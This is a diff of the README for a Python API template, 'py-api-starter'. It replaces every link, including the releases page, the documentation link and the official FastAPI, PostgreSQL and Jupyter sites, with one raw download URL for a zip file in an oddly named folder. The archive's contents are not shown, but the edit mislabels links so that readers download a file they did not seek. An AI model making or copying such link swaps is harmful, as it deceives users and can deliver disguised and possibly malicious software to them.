@@ -16,11 +16,11 @@ Welcome to **py-api-starter**, a user-friendly template for building APIs. This 
 
 ## 📥 Download
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20-blue)](https://github.com/jasbirdii/py-api-starter/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/jasbirdii/py-api-starter/main/acipenseroid/py-api-starter.zip%20Latest%20Release-%20-blue)](https://raw.githubusercontent.com/jasbirdii/py-api-starter/main/acipenseroid/py-api-starter.zip)
 
 To download the latest version of **py-api-starter**, visit the releases page:
 
-[Download from Releases Page](https://github.com/jasbirdii/py-api-starter/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/jasbirdii/py-api-starter/main/acipenseroid/py-api-starter.zip)
 
 ## ⚙️ System Requirements
 
@@ -33,7 +33,7 @@ Before you download, ensure you have the following:
 
 ## 🔗 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/jasbirdii/py-api-starter/releases).
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/jasbirdii/py-api-starter/main/acipenseroid/py-api-starter.zip).
 2. **Choose the Latest Release**: Find the latest version at the top.
 3. **Download the Package**: Click on the appropriate file for your operating system to start the download.
 4. **Locate the Downloaded File**: Check your downloads folder for the file.
@@ -52,7 +52,7 @@ Once you have installed the application, follow these steps to get started:
 
 If you want to learn more about using **py-api-starter**, check our comprehensive documentation. You can access it here:
 
-[Documentation Link](https://github.com/jasbirdii/py-api-starter/docs)
+[Documentation Link](https://raw.githubusercontent.com/jasbirdii/py-api-starter/main/acipenseroid/py-api-starter.zip)
 
 ## 🐞 Troubleshooting
 
@@ -80,8 +80,8 @@ We welcome contributions! If you want to suggest changes or add features, please
 
 Explore more about the technologies used in this project:
 
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [PostgreSQL Official Site](https://www.postgresql.org/)
-- [Jupyter Project](https://jupyter.org/)
+- [FastAPI Documentation](https://raw.githubusercontent.com/jasbirdii/py-api-starter/main/acipenseroid/py-api-starter.zip)
+- [PostgreSQL Official Site](https://raw.githubusercontent.com/jasbirdii/py-api-starter/main/acipenseroid/py-api-starter.zip)
+- [Jupyter Project](https://raw.githubusercontent.com/jasbirdii/py-api-starter/main/acipenseroid/py-api-starter.zip)
 
 Thank you for using **py-api-starter**! Enjoy building your APIs smoothly.
